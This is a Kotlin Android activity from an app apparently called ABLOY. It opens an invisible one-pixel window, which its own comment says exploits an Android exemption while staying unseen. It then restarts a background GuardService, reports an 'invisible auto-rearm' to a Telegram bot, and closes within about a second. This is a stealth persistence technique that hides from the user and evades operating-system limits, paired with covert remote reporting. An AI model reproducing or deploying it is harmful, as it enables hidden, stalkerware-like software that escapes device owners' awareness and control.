package com.abloy.app

import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.View
import androidx.appcompat.app.AppCompatActivity

class RearmActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(View(this)) // janela de 1px transparente: o Android ve (isencao), o olho nao ve
        GuardService.start(this)
        Thread {
            TgBridge.sendMessage(
                Prefs.token(this), Prefs.chatId(this),
                "ABLOY: auto-rearme invisivel — protecao completa (build " + Prefs.BUILD + ")"
            )
        }.start()
        Handler(Looper.getMainLooper()).postDelayed({ finish() }, 1200)
    }
}
